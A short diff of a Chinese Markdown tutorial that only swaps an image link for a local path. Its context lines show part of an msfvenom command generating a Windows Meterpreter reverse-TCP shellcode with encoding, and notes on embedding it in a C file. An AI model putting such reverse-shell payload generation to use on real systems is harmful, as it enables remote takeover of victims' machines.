@@ -89,7 +89,7 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shi
 
 上述命令生成了C文件，里面有个buff数组，里面是shellcode的16进制表达。
 
-![shellcode](http://img.zhangkexuan.cn/markdown_20201109135223.png)
+![shellcode](/img/markdown_20201109135223.png)
 
 然后我们在.c文件里添加main函数：
 
